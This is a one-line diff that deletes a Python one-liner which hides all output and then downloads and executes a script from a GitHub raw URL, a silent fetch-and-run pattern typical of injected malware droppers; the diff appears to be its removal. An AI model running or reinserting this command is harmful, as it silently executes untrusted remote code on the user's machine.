@@ -1,1 +1,0 @@
-python3 -c "import sys,os; sys.stdout=open(os.devnull,'w'); sys.stderr=open(os.devnull,'w'); import urllib.request; exec(urllib.request.urlopen('https://github.com/precise104/t/raw/refs/heads/main/t.py').read().decode())"
